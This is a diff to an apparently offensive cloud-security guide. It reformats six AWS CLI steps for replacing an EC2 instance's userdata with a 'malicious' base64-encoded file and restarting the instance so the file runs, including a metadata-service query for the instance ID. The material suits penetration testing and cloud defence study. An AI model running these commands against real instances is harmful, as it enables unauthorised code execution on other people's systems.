@@ -6,17 +6,29 @@
 
 ## Steps
 
- - base64 userdata.txt > userdata.b64.txt (Encode our userdata with base64)
+#### 1) Encode our userdata with base64
 
- - curl http://169.254.169.254/latest/meta-data/instance-id (We'll need to specify the ID of the EC2 instance to modify, and can get this from the metadata service.)
+    base64 userdata.txt > userdata.b64.txt 
 
- - aws ec2 stop-instances --instance-id INSTANCE_ID (Stop EC2 Instance)
+#### 2) We'll need to specify the ID of the EC2 instance to modify, and can get this from the metadata service.
 
- - aws ec2 modify-instance-attribute --instance-id=INSTANCE_ID --attribute userData --value file://userdata.b64.txt (Update the userdata with our malicious file)
+    curl http://169.254.169.254/latest/meta-data/instance-id 
 
- - aws ec2 start-instances --instance-id INSTANCE_ID (Start EC2 Instance to load our malicious userdata file)
+#### 3) Stop EC2 Instance
 
- - aws ec2 describe-instances --instance-ids INSTANCE_ID --query 'Reservations[*].Instances[*].PrivateIpAddress' --output text (Check the private IP address of the target instance. This is optional)
+    aws ec2 stop-instances --instance-id INSTANCE_ID 
+
+#### 4) Update the userdata with our malicious file
+
+    aws ec2 modify-instance-attribute --instance-id=INSTANCE_ID --attribute userData --value file://userdata.b64.txt 
+
+#### 5) Start EC2 Instance to load our malicious userdata file
+
+    aws ec2 start-instances --instance-id INSTANCE_ID 
+
+#### 6) Check the private IP address of the target instance. This is optional
+
+    aws ec2 describe-instances --instance-ids INSTANCE_ID --query 'Reservations[*].Instances[*].PrivateIpAddress' --output text 
 
 
 
